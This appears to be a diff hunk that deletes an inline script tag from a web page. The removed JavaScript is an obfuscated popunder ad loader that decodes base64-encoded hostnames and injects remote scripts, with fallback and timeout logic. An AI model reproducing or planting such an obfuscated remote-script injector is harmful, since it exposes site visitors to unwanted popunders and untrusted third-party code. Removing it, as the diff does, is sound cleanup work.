@@ -1,5 +1,0 @@
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-    (function(){var f=window,l="c2e2cf9b2749713dfdebcfc59023eb40",w=[["siteId",181*916*451+77+820-72475748],["minBid",0],["popundersPerIP","3:1"],["delayBetween",60],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],r=["d3d3LnByZW1pdW12ZXJ0aXNpbmcuY29tL2t1bmR2TS9qbnVtZXJhbC5taW4uanM=","ZDJqMDQyY2oxNDIxd2kuY2xvdWRmcm9udC5uZXQvdy9tWmZuL2thdWdtZW50Lm1pbi5jc3M="],k=-1,i,h,p=function(){clearTimeout(h);k++;if(r[k]&&!(1815576909000<(new Date).getTime()&&1<k)){i = f.document.createElement("script");i.type="text/javascript";i.async=!0;var u=f.document.getElementsByTagName("script")[0];i.src="https://"+atob(r[k]);i.crossOrigin="anonymous";i.onerror=p;i.onload=function(){clearTimeout(h);f[l.slice(0,16)+l.slice(0,16)]||p()};h=setTimeout(p,5E3);u.parentNode.insertBefore(i,u)}};if(!f[l]){try{Object.freeze(f[l] = w)}catch(e){ }p()}})();
-/*]]>/* */
-</script>
